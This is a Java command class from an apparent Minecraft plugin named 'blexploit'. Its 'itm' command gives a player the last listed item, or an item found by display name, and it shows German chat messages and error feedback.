package de.blexploit.command.cmds;

import java.util.ArrayList;

import de.blexploit.Start;
import de.blexploit.command.Command;
import de.blexploit.inventory.creator.InvItem;
import de.blexploit.inventory.creator.InvItemManager;
import de.blexploit.players.create.MittrollerEntity;

public final class Itm extends Command {

	public static InvItem itm = null;

	public Itm() {
		super("itm", "Gibt das letzte Item im Chat oder das was du suchst", "(item_Name)");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length == 1) {
			if (itm == null) {
				mt.fehler("Es wurde noch kein Item ausgegeben");
				return;
			}
			if (itm.getRealItemStack() == null) {
				mt.fehler("Fehler beim ItemStack");
				return;
			}
			mt.getPlayer().getInventory().setItemInMainHand(itm.getRealItemStack());
			mt.sendMessage("Du hast das letzte Item erhalten!");
		} else if (args.length > 1) {
			ArrayList<InvItem> invitem = InvItemManager.invitems;
			boolean found = false;
			for (InvItem it : invitem) {
				if (it.getDisplayname().replace(" ", "_").equalsIgnoreCase(args[1])) {
					if (mt.getPlayer().getInventory().getHeldItemSlot() == 8) {
						mt.getPlayer().getInventory().setHeldItemSlot(0);
					}
					mt.getPlayer().getInventory().setItemInMainHand(it.getRealItemStack());
					mt.playsound("BLOCK_LAVA_POP", 10, 2);
					found = true;
				}
			}
			if (!found) {
				mt.fehler("Dieses Item wurde nicht gefunden!");
				mt.sendMessage("Benutze den Befehl " + Start.Befehlzeichen + "search um ein Item zu suchen!");
			}
		}
	}

}
